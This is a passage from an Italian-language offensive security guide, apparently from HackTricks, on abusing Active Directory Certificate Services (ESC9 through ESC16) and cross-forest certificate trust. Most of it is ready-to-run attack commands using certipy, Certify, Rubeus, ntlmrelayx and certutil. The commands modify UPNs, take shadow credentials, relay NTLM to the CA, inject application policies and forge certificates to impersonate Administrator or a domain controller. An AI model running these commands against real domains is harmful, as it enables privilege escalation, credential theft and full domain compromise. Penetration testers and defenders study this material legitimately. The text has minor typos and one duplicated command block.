certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo intenzionalmente la parte di dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Questa modifica non viola i vincoli, poiché `Administrator@corp.local` rimane distinto come userPrincipalName di `Administrator`.

Successivamente, il template di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Si nota che il `userPrincipalName` del certificato riflette `Administrator`, privo di qualsiasi “object SID”.

Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo valore originale, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tentare l'autenticazione con il certificato emesso ora restituisce l'NT hash di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` a causa dell'assenza della specifica del dominio nel certificato:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappature deboli dei certificati - ESC10

### Spiegazione

Due valori di chiavi del registro sul controller di dominio sono indicati da ESC10:

- Il valore predefinito per `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` è `0x18` (`0x8 | 0x10`), precedentemente impostato su `0x1F`.
- L'impostazione predefinita per `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` è `1`, precedentemente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` è configurato come `0`.

**Caso 2**

Se `CertificateMappingMethods` include il bit `UPN` (`0x4`).

### Caso di abuso 1

Con `StrongCertificateBindingEnforcement` configurato come `0`, un account A con permessi `GenericWrite` può essere sfruttato per compromettere qualsiasi account B.

Per esempio, avendo permessi `GenericWrite` su `Jane@corp.local`, un attaccante mira a compromettere `Administrator@corp.local`. La procedura rispecchia ESC9, permettendo di utilizzare qualsiasi modello di certificato.

Inizialmente, l'hash di `Jane` viene recuperato usando Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione di vincolo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A seguito di ciò, viene richiesto un certificato che abilita l'autenticazione del client come `Jane`, usando il modello predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo valore originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
L'autenticazione con il certificato ottenuto restituirà l'NT hash di `Administrator@corp.local`, richiedendo la specifica del dominio nel comando poiché nel certificato mancano i dettagli del dominio.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso d'abuso 2

Con i `CertificateMappingMethods` che contengono il flag bit `UPN` (`0x4`), un account A con permessi `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l'amministratore di dominio integrato `Administrator`.

Qui, l'obiettivo è compromettere `DC$@corp.local`, iniziando dall'ottenere l'hash di `Jane` tramite Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Il `userPrincipalName` di `Jane` viene quindi impostato su `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Viene richiesto un certificato per l'autenticazione del client come `Jane` utilizzando il template predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene ripristinato al suo valore originale dopo questo processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Per autenticarsi tramite Schannel, viene utilizzata l'opzione `-ldap-shell` di Certipy, che indica il successo dell'autenticazione come `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Attraverso la LDAP shell, comandi come `set_rbcd` consentono attacchi Resource-Based Constrained Delegation (RBCD), compromettendo potenzialmente il domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Questa vulnerabilità si estende anche a qualsiasi account utente privo di un `userPrincipalName` o in cui esso non corrisponde al `sAMAccountName`; l'account predefinito `Administrator@corp.local` è un obiettivo privilegiato a causa dei suoi elevati privilegi LDAP e dell'assenza di un `userPrincipalName` di default.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se il CA Server non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, è possibile eseguire attacchi di relay NTLM senza signing tramite il servizio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puoi usare `certipy` per verificare se `Enforce Encryption for Requests` è Disabled e certipy mostrerà le vulnerabilità `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario di abuso

È necessario impostare un relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Per i domain controller, dobbiamo specificare `-template` in DomainController.

Oppure usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Gli amministratori possono configurare la Certificate Authority in modo da memorizzarla su un dispositivo esterno come lo Yubico YubiHSM2.

Se un dispositivo USB è collegato al server CA tramite una porta USB, o tramite un USB device server nel caso in cui il server CA sia una macchina virtuale, per il Key Storage Provider è richiesta una chiave di autenticazione (a volte indicata come "password") per generare e utilizzare le chiavi nell'YubiHSM.

Questa chiave/password è memorizzata nel registro sotto `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in chiaro.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Se la chiave privata della CA è memorizzata su un dispositivo USB fisico, quando si ottiene accesso shell è possibile recuperarla.

Per prima cosa, è necessario ottenere il certificato della CA (questo è pubblico) e poi:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Infine, usa il comando certutil `-sign` per forgiare un nuovo certificato arbitrario usando il certificato CA e la sua chiave privata.

## OID Group Link Abuse - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` permette di aggiungere la policy di emissione al modello del certificato. Gli oggetti `msPKI-Enterprise-Oid` responsabili delle policy di emissione possono essere scoperti nel Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenitore PKI OID. Una policy può essere collegata a un gruppo AD usando l'attributo `msDS-OIDToGroupLink` di questo oggetto, consentendo a un sistema di autorizzare un utente che presenta il certificato come se fosse membro del gruppo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In altre parole, quando un utente ha il permesso di richiedere un certificato e il certificato è collegato a un gruppo OID, l'utente può ereditare i privilegi di quel gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario di abuso

Trova un permesso utente che può usare con `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` ha il permesso di effettuare l'enrollment su `VulnerableTemplate`, l'utente può ereditare i privilegi del gruppo `VulnerableGroup`.

Tutto ciò che deve fare è specificare il template; otterrà un certificato con i diritti OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configurazione di rinnovo certificati vulnerabile - ESC14

### Spiegazione

La descrizione su https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping è straordinariamente dettagliata. Di seguito è riportata una citazione del testo originale.

ESC14 affronta le vulnerabilità derivanti da "weak explicit certificate mapping", principalmente attraverso l'uso improprio o la configurazione insicura dell'attributo `altSecurityIdentities` sugli account utente o computer di Active Directory. Questo attributo multivalore permette agli amministratori di associare manualmente certificati X.509 a un account AD per scopi di autenticazione. Quando è popolato, questo mapping esplicito può sovrascrivere la logica di mapping predefinita dei certificati, che tipicamente si basa su UPNs o nomi DNS nel SAN del certificato, o sul SID incorporato nell'estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`.

Un mapping "debole" si verifica quando il valore stringa usato all'interno dell'attributo `altSecurityIdentities` per identificare un certificato è troppo generico, facilmente indovinabile, si basa su campi non univoci del certificato, o usa componenti del certificato facilmente spoofabili. Se un attaccante può ottenere o creare un certificato i cui attributi corrispondono a un mapping esplicito debolmente definito per un account privilegiato, può usare quel certificato per autenticarsi e impersonare quell'account.

Esempi di stringhe di mapping `altSecurityIdentities` potenzialmente deboli includono:

- Mapping unicamente tramite un comune Subject Common Name (CN): ad es., `X509:<S>CN=SomeUser`. Un attaccante potrebbe riuscire a ottenere un certificato con questo CN da una fonte meno sicura.
- Uso di Issuer Distinguished Names (DN) o Subject DNs eccessivamente generici senza ulteriori qualifiche come un numero di serie specifico o subject key identifier: ad es., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Impiego di altri pattern prevedibili o identificatori non crittografici che un attaccante potrebbe riuscire a soddisfare in un certificato che può legittimamente ottenere o forgiare (se ha compromesso una CA o trovato un template vulnerabile come in ESC1).

L'attributo `altSecurityIdentities` supporta vari formati per il mapping, come:

- `X509:<I>IssuerDN<S>SubjectDN` (mappa per Issuer e Subject DN completi)
- `X509:<SKI>SubjectKeyIdentifier` (mappa per il valore dell'estensione Subject Key Identifier del certificato)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappa per numero di serie, implicitamente qualificato dall'Issuer DN) - questo non è un formato standard, di solito è `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappa per un nome RFC822, tipicamente un indirizzo email, dal SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappa per un hash SHA1 della raw public key del certificato - generalmente forte)

La sicurezza di questi mapping dipende fortemente dalla specificità, univocità e forza crittografica degli identificatori di certificato scelti nella stringa di mapping. Anche con modalità di binding dei certificati forti abilitate sui Domain Controllers (che influenzano principalmente i mapping impliciti basati su SAN UPNs/DNS e l'estensione SID), una voce `altSecurityIdentities` mal configurata può comunque rappresentare un percorso diretto per l'impersonazione se la logica di mapping stessa è difettosa o troppo permissiva.

### Scenario di abuso

ESC14 prende di mira le **explicit certificate mappings** in Active Directory (AD), specificamente l'attributo `altSecurityIdentities`. Se questo attributo è impostato (per design o per errata configurazione), gli attaccanti possono impersonare account presentando certificati che corrispondono al mapping.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondizione**: L'attaccante ha permessi di scrittura sull'attributo `altSecurityIdentities` dell'account target o il permesso di concederlo nella forma di uno dei seguenti permessi sull'oggetto AD target:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondizione**: Il target ha un mapping X509RFC822 debole in altSecurityIdentities. Un attaccante può impostare l'attributo mail della vittima per farlo corrispondere al nome X509RFC822 del target, richiedere un certificato come la vittima e usarlo per autenticarsi come il target.

#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondizione**: Il target ha un mapping esplicito X509IssuerSubject in `altSecurityIdentities` debole. L'attaccante può impostare l'attributo `cn` o `dNSHostName` su un principal vittima per farlo corrispondere al subject del mapping X509IssuerSubject del target. Successivamente, l'attaccante può richiedere un certificato come la vittima e usare quel certificato per autenticarsi come il target.

#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondizione**: Il target ha un mapping esplicito X509SubjectOnly in `altSecurityIdentities` debole. L'attaccante può impostare l'attributo `cn` o `dNSHostName` su un principal vittima per farlo corrispondere al subject del mapping X509SubjectOnly del target. Successivamente, l'attaccante può richiedere un certificato come la vittima e usare quel certificato per autenticarsi come il target.

### operazioni concrete
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salva e converti il certificato
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticarsi (utilizzando il certificato)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Pulizia (opzionale)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Per metodi d'attacco più specifici in vari scenari di attacco, fare riferimento a quanto segue: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Spiegazione

La descrizione su https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc è notevolmente esaustiva. Di seguito è riportata una citazione del testo originale.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuso

Quanto segue fa riferimento a [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


Il comando `find` di Certipy può aiutare a identificare template V1 che potrebbero essere suscettibili a ESC15 se la CA non è aggiornata.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Passo 1: Richiedere un certificato, inserendo la Application Policy "Client Authentication" e l'UPN di destinazione.** L'attaccante `attacker@corp.local` prende di mira `administrator@corp.local` usando il template "WebServer" V1 (che permette che il subject del certificato sia fornito dall'iscritto).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Il template V1 vulnerabile con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inietta l'OID `1.3.6.1.5.5.7.3.2` nell'estensione Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Imposta l'UPN nel SAN per impersonare.

**Passo 2: Autenticarsi tramite Schannel (LDAPS) usando il certificato ottenuto.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Passo 1: Richiedere un certificato da un template V1 (con "Enrollee supplies subject"), iniettando la Application Policy "Certificate Request Agent".** Questo certificato è per l'attaccante (`attacker@corp.local`) per diventare un enrollment agent. Nessun UPN è specificato per l'identità dell'attaccante qui, poiché l'obiettivo è la capacità di agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Passo 2: Usa il certificato "agent" per richiedere un certificato per conto di un utente privilegiato target.** Questo è un passaggio simile a ESC3, usando il certificato del Passo 1 come certificato "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Passo 3: Autenticarsi come utente privilegiato usando il certificato "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Estensione di sicurezza disabilitata sulla CA (globalmente)-ESC16

### Spiegazione

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** si riferisce allo scenario in cui, se la configurazione di AD CS non impone l'inclusione dell'estensione **szOID_NTDS_CA_SECURITY_EXT** in tutti i certificati, un attaccante può sfruttarlo:

1. Richiedendo un certificato **without SID binding**.

2. Usando questo certificato **per l'autenticazione come qualsiasi account**, ad esempio impersonando un account ad alto privilegio (ad es., un Domain Administrator).

Puoi anche fare riferimento a questo articolo per saperne di più sul principio dettagliato:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

Quanto segue fa riferimento a [questo link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Clicca per vedere metodi d'uso più dettagliati.

Per identificare se l'ambiente Active Directory Certificate Services (AD CS) è vulnerabile a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Passo 1: Leggi l'UPN iniziale dell'account della vittima (Opzionale - per il ripristino).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passo 2: Aggiorna l'UPN dell'account vittima con il `sAMAccountName` dell'amministratore target.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Passo 3: (Se necessario) Ottenere le credenziali per l'account "victim" (es., via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: Richiedi un certificato come utente "vittima" da _qualsiasi template di autenticazione client adatto_ (p.es., "User") sulla CA vulnerabile a ESC16.** Poiché la CA è vulnerabile a ESC16, ometterà automaticamente l'estensione di sicurezza SID dal certificato emesso, indipendentemente dalle impostazioni specifiche del template per questa estensione. Imposta la variabile d'ambiente della cache delle credenziali Kerberos (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Quindi richiedi il certificato:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Passo 5: Ripristina l'UPN dell'account "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Passo 6: Autenticarsi come amministratore target.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromissione delle foreste con i certificati spiegata in forma passiva

### Violazione dei trust tra foreste dovuta a CA compromesse

La configurazione per l'**iscrizione tra foreste** è resa relativamente semplice. Il **certificato root CA** della foresta di risorse viene **pubblicato nelle foreste account** dagli amministratori, e i certificati della **enterprise CA** della foresta di risorse vengono **aggiunti ai contenitori `NTAuthCertificates` e AIA in ciascuna foresta account**. Per chiarire, questa disposizione concede alla **CA nella foresta di risorse il controllo completo** su tutte le altre foreste per le quali gestisce la PKI. Qualora questa CA fosse **compromessa dagli attaccanti**, i certificati per tutti gli utenti sia della foresta di risorse sia delle foreste account potrebbero essere **falsificati da essi**, rompendo così il confine di sicurezza della foresta.

### Privilegi di enrollment concessi a principal esterni

Negli ambienti multi-foresta, è necessaria cautela riguardo alle Enterprise CAs che **pubblicano template di certificato** che consentono a **Authenticated Users o a foreign principals** (utenti/gruppi esterni alla foresta a cui appartiene l'Enterprise CA) **diritti di enrollment e modifica**.\
Al momento dell'autenticazione attraverso un trust, l'**Authenticated Users SID** viene aggiunto al token dell'utente da AD. Pertanto, se un dominio possiede un'Enterprise CA con un template che **consente a Authenticated Users i diritti di enrollment**, un template potrebbe potenzialmente essere **iscritto da un utente di una foresta diversa**. Allo stesso modo, se **i diritti di enrollment sono esplicitamente concessi a un foreign principal da un template**, viene così creata una **relazione di controllo accessi cross-forest**, permettendo a un principal di una foresta di **iscriversi a un template di un'altra foresta**.

Entrambi gli scenari comportano un **aumento della superficie d'attacco** da una foresta all'altra. Le impostazioni del template di certificato potrebbero essere sfruttate da un attaccante per ottenere privilegi aggiuntivi in un dominio esterno.


## Riferimenti

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
